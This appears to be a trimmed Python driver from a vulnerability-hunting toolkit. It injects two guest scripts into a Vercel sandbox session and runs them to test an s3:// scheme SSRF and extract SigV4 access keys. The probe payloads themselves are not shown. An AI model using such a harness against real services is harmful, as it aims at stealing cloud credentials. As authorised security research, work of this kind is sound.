# -*- coding: utf-8 -*-
"""v192 驱动: s3:// scheme SSRF + SigV4 AccessKey 提取验证"""
...
NAME = 'v192'
GUEST = r'D:\scan\skills\non-traditional-vuln-hunting\vda192_guest.py'
PAY = r'D:\scan\skills\non-traditional-vuln-hunting\vda192_probe_guest.py'
...
def main():
    ...
    inject(sid, '/vercel/sandbox/vda192_guest.py', open(GUEST, 'rb').read())
    inject(sid, '/vercel/sandbox/vda192_probe_guest.py', open(PAY, 'rb').read())
    c, r = cmd(sid, 'python3', ['/vercel/sandbox/vda192_guest.py'], 240000)
    print('[run guest]', c)
    print((r or '')[:12000])

    c, r = cmd(sid, 'sh', ['-c', 'cat /vercel/sandbox/v192c.out 2>&1'], 20000)
    print('[v192c.out]', c)
    print((r or '')[:25000])
